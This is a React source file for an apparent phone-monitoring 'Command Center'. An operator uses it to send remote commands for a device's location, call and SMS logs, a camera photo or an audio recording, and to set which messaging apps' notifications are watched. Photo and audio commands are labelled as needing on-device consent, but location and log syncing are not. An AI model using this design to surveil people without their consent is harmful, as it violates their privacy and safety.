import React, { useState } from 'react';
import { 
  Box, 
  Typography, 
  Paper, 
  Divider, 
  Grid, 
  Button, 
  Select, 
  MenuItem, 
  FormControl, 
  InputLabel, 
  TextField, 
  Dialog, 
  DialogTitle, 
  DialogContent, 
  DialogContentText, 
  DialogActions,
  Alert,
  CircularProgress,
  List,
  ListItem,
  ListItemText
} from '@mui/material';
import { Send as SendIcon } from '@mui/icons-material';
import { sendCommand, getCommandHistory } from '../services/api';

function CommandCenter({ devices, selectedDevice, onSelectDevice }) {
  const [commandType, setCommandType] = useState('');
  const [commandParams, setCommandParams] = useState({});
  const [loading, setLoading] = useState(false);
  const [historyLoading, setHistoryLoading] = useState(false);
  const [commandHistory, setCommandHistory] = useState([]);
  const [showHistory, setShowHistory] = useState(false);
  const [confirmDialogOpen, setConfirmDialogOpen] = useState(false);
  const [status, setStatus] = useState({ type: '', message: '' });
  
  // Command types with their parameters
  const commandTypes = [
    { value: 'get_location', label: 'Request Location Update', params: [] },
    { value: 'sync_logs', label: 'Sync Device Logs', params: [] },
    { value: 'take_photo', label: 'Take Photo', 
      params: [
        { name: 'camera', label: 'Camera', type: 'select', options: [
          { value: 'front', label: 'Front Camera' },
          { value: 'back', label: 'Back Camera' }
        ]}
      ] 
    },
    { value: 'record_audio', label: 'Record Audio', 
      params: [
        { name: 'duration', label: 'Duration (seconds)', type: 'number', min: 1, max: 60 }
      ] 
    },
    { value: 'update_monitored_apps', label: 'Update Monitored Apps', 
      params: [
        { name: 'apps', label: 'App Packages (comma-separated)', type: 'text', 
          placeholder: 'com.whatsapp,com.facebook.orca' }
      ] 
    }
  ];
  
  const handleCommandTypeChange = (event) => {
    setCommandType(event.target.value);
    setCommandParams({});
  };
  
  const handleParamChange = (paramName, value) => {
    setCommandParams({
      ...commandParams,
      [paramName]: value
    });
  };
  
  const handleSendCommand = async () => {
    if (!selectedDevice) {
      setStatus({
        type: 'error',
        message: 'Please select a device first'
      });
      return;
    }
    
    try {
      setLoading(true);
      setConfirmDialogOpen(false);
      
      const result = await sendCommand(selectedDevice.id, commandType, commandParams);
      
      setStatus({
        type: 'success',
        message: `Command sent successfully to ${selectedDevice.model || 'device'}`
      });
      
      // Reset form
      setCommandType('');
      setCommandParams({});
      
      // Refresh command history if it's open
      if (showHistory) {
        fetchCommandHistory();
      }
    } catch (error) {
      console.error('Failed to send command:', error);
      setStatus({
        type: 'error',
        message: `Failed to send command: ${error.message || 'Unknown error'}`
      });
    } finally {
      setLoading(false);
    }
  };
  
  const fetchCommandHistory = async () => {
    if (!selectedDevice) return;
    
    try {
      setHistoryLoading(true);
      const history = await getCommandHistory(selectedDevice.id);
      setCommandHistory(history);
    } catch (error) {
      console.error('Failed to fetch command history:', error);
    } finally {
      setHistoryLoading(false);
    }
  };
  
  const handleViewHistory = () => {
    if (!showHistory) {
      fetchCommandHistory();
    }
    setShowHistory(!showHistory);
  };
  
  // Format the timestamp
  const formatDateTime = (timestamp) => {
    if (!timestamp) return 'N/A';
    return new Date(timestamp).toLocaleString();
  };
  
  // Validate if all required parameters are filled
  const validateParams = () => {
    const commandConfig = commandTypes.find(cmd => cmd.value === commandType);
    if (!commandConfig) return false;
    
    for (const param of commandConfig.params) {
      if (commandParams[param.name] === undefined || commandParams[param.name] === '') {
        return false;
      }
    }
    
    return true;
  };
  
  const isFormValid = selectedDevice && commandType && validateParams();
  
  return (
    <Box>
      <Paper sx={{ mb: 3 }}>
        <Box p={2} bgcolor="primary.main" color="white">
          <Typography variant="h6">
            Command Center
          </Typography>
        </Box>
        <Divider />
        
        <Box p={2}>
          {status.type && (
            <Alert 
              severity={status.type} 
              sx={{ mb: 2 }}
              onClose={() => setStatus({ type: '', message: '' })}
            >
              {status.message}
            </Alert>
          )}
          
          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <FormControl fullWidth variant="outlined" sx={{ mb: 2 }}>
                <InputLabel id="device-select-label">Device</InputLabel>
                <Select
                  labelId="device-select-label"
                  value={selectedDevice ? selectedDevice.id : ''}
                  onChange={(e) => {
                    const device = devices.find(d => d.id === e.target.value);
                    if (device) onSelectDevice(device);
                  }}
                  label="Device"
                  disabled={loading}
                >
                  {devices.map((device) => (
                    <MenuItem key={device.id} value={device.id}>
                      {device.model || 'Unknown'} - {device.id.substring(0, 8)}...
                    </MenuItem>
                  ))}
                </Select>
              </FormControl>
              
              <FormControl fullWidth variant="outlined" sx={{ mb: 2 }}>
                <InputLabel id="command-type-label">Command Type</InputLabel>
                <Select
                  labelId="command-type-label"
                  value={commandType}
                  onChange={handleCommandTypeChange}
                  label="Command Type"
                  disabled={loading}
                >
                  {commandTypes.map((cmd) => (
                    <MenuItem key={cmd.value} value={cmd.value}>
                      {cmd.label}
                    </MenuItem>
                  ))}
                </Select>
              </FormControl>
              
              {commandType && commandTypes.find(cmd => cmd.value === commandType)?.params.map((param) => (
                <FormControl fullWidth variant="outlined" sx={{ mb: 2 }} key={param.name}>
                  {param.type === 'select' ? (
                    <>
                      <InputLabel id={`${param.name}-label`}>{param.label}</InputLabel>
                      <Select
                        labelId={`${param.name}-label`}
                        value={commandParams[param.name] || ''}
                        onChange={(e) => handleParamChange(param.name, e.target.value)}
                        label={param.label}
                        disabled={loading}
                      >
                        {param.options.map((option) => (
                          <MenuItem key={option.value} value={option.value}>
                            {option.label}
                          </MenuItem>
                        ))}
                      </Select>
                    </>
                  ) : (
                    <TextField
                      label={param.label}
                      type={param.type}
                      value={commandParams[param.name] || ''}
                      onChange={(e) => handleParamChange(param.name, e.target.value)}
                      disabled={loading}
                      placeholder={param.placeholder}
                      inputProps={{ 
                        min: param.min, 
                        max: param.max 
                      }}
                    />
                  )}
                </FormControl>
              ))}
              
              <Box mt={2} display="flex" justifyContent="space-between">
                <Button
                  variant="contained"
                  color="primary"
                  startIcon={<SendIcon />}
                  disabled={!isFormValid || loading}
                  onClick={() => setConfirmDialogOpen(true)}
                >
                  {loading ? <CircularProgress size={24} /> : 'Send Command'}
                </Button>
                
                <Button
                  variant="outlined"
                  onClick={handleViewHistory}
                  disabled={!selectedDevice}
                >
                  {showHistory ? 'Hide History' : 'View Command History'}
                </Button>
              </Box>
            </Grid>
            
            <Grid item xs={12} md={6}>
              <Paper elevation={2} sx={{ p: 2, height: '100%' }}>
                <Typography variant="h6" gutterBottom>
                  Command Information
                </Typography>
                <Divider sx={{ mb: 2 }} />
                
                {commandType ? (
                  <Box>
                    <Typography variant="subtitle1">
                      {commandTypes.find(cmd => cmd.value === commandType)?.label}
                    </Typography>
                    <Typography variant="body2" color="textSecondary" paragraph>
                      {getCommandDescription(commandType)}
                    </Typography>
                    
                    <Typography variant="subtitle2" gutterBottom>
                      Permissions Required:
                    </Typography>
                    <Box component="ul" sx={{ pl: 2 }}>
                      {getCommandPermissions(commandType).map((perm, index) => (
                        <Typography component="li" variant="body2" key={index}>
                          {perm}
                        </Typography>
                      ))}
                    </Box>
                    
                    <Typography variant="subtitle2" sx={{ mt: 2 }} gutterBottom>
                      Privacy Impact:
                    </Typography>
                    <Typography variant="body2" color="textSecondary">
                      {getCommandPrivacyImpact(commandType)}
                    </Typography>
                  </Box>
                ) : (
                  <Typography variant="body2" color="textSecondary">
                    Select a command type to see information about it.
                  </Typography>
                )}
              </Paper>
            </Grid>
          </Grid>
        </Box>
      </Paper>
      
      {showHistory && (
        <Paper>
          <Box p={2} bgcolor="primary.main" color="white">
            <Typography variant="h6">
              Command History
            </Typography>
          </Box>
          <Divider />
          
          <Box p={2} maxHeight="300px" overflow="auto">
            {historyLoading ? (
              <Box display="flex" justifyContent="center" p={3}>
                <CircularProgress />
              </Box>
            ) : commandHistory.length === 0 ? (
              <Typography variant="body2" color="textSecondary" align="center">
                No command history found for this device.
              </Typography>
            ) : (
              <List>
                {commandHistory.map((cmd, index) => (
                  <ListItem key={index} divider={index < commandHistory.length - 1}>
                    <ListItemText
                      primary={
                        <Typography variant="subtitle2">
                          {commandTypes.find(c => c.value === cmd.command)?.label || cmd.command}
                          {cmd.status === 'completed' && (
                            <Divider sx={{ ml: 1, mr: 1, display: 'inline-block', verticalAlign: 'middle' }} orientation="vertical" flexItem />
                          )}
                          {cmd.status === 'completed' && (
                            <Typography component="span" color="success.main" variant="body2">
                              Completed
                            </Typography>
                          )}
                          {cmd.status === 'failed' && (
                            <Typography component="span" color="error.main" variant="body2">
                              Failed
                            </Typography>
                          )}
                          {cmd.status === 'pending' && (
                            <Typography component="span" color="warning.main" variant="body2">
                              Pending
                            </Typography>
                          )}
                        </Typography>
                      }
                      secondary={
                        <>
                          <Typography variant="body2" color="textSecondary">
                            Sent: {formatDateTime(cmd.timestamp)}
                          </Typography>
                          {cmd.response && (
                            <Typography variant="body2" color="textSecondary">
                              Response: {cmd.response}
                            </Typography>
                          )}
                        </>
                      }
                    />
                  </ListItem>
                ))}
              </List>
            )}
          </Box>
        </Paper>
      )}
      
      {/* Confirmation Dialog */}
      <Dialog
        open={confirmDialogOpen}
        onClose={() => setConfirmDialogOpen(false)}
      >
        <DialogTitle>Confirm Command</DialogTitle>
        <DialogContent>
          <DialogContentText>
            Are you sure you want to send this command to {selectedDevice?.model || 'the selected device'}?
            
            {commandType === 'take_photo' || commandType === 'record_audio' ? (
              <Box component="div" sx={{ mt: 2, color: 'error.main' }}>
                <strong>Warning:</strong> This command requires explicit user consent on the device and 
                will only work if the user approves the request.
              </Box>
            ) : null}
          </DialogContentText>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setConfirmDialogOpen(false)} color="primary">
            Cancel
          </Button>
          <Button onClick={handleSendCommand} color="primary" variant="contained">
            Confirm
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}

// Helper functions to get command information
function getCommandDescription(commandType) {
  switch (commandType) {
    case 'get_location':
      return 'Requests the current location of the device. This will trigger a location update even if the device is not actively reporting its location.';
    case 'sync_logs':
      return 'Requests the device to immediately sync all pending logs (calls, SMS, notifications, etc.) with the server.';
    case 'take_photo':
      return 'Requests the device to take a photo using the specified camera. This requires explicit user consent on the device.';
    case 'record_audio':
      return 'Requests the device to record audio for the specified duration. This requires explicit user consent on the device.';
    case 'update_monitored_apps':
      return 'Updates the list of applications that should be monitored for notifications.';
    default:
      return 'No description available.';
  }
}

function getCommandPermissions(commandType) {
  switch (commandType) {
    case 'get_location':
      return ['Location'];
    case 'sync_logs':
      return ['SMS', 'Call Logs', 'File Access'];
    case 'take_photo':
      return ['Camera', 'Storage'];
    case 'record_audio':
      return ['Microphone', 'Storage'];
    case 'update_monitored_apps':
      return ['Notification Access'];
    default:
      return ['None'];
  }
}

function getCommandPrivacyImpact(commandType) {
  switch (commandType) {
    case 'get_location':
      return 'Medium - This command will access the device\'s precise location.';
    case 'sync_logs':
      return 'Medium - This command will access the device\'s SMS and call logs.';
    case 'take_photo':
      return 'High - This command will use the device\'s camera to take a photo. Explicit user consent is required.';
    case 'record_audio':
      return 'High - This command will use the device\'s microphone to record audio. Explicit user consent is required.';
    case 'update_monitored_apps':
      return 'Low - This command only updates the list of apps to monitor for notifications.';
    default:
      return 'Unknown privacy impact.';
  }
}

export default CommandCenter;
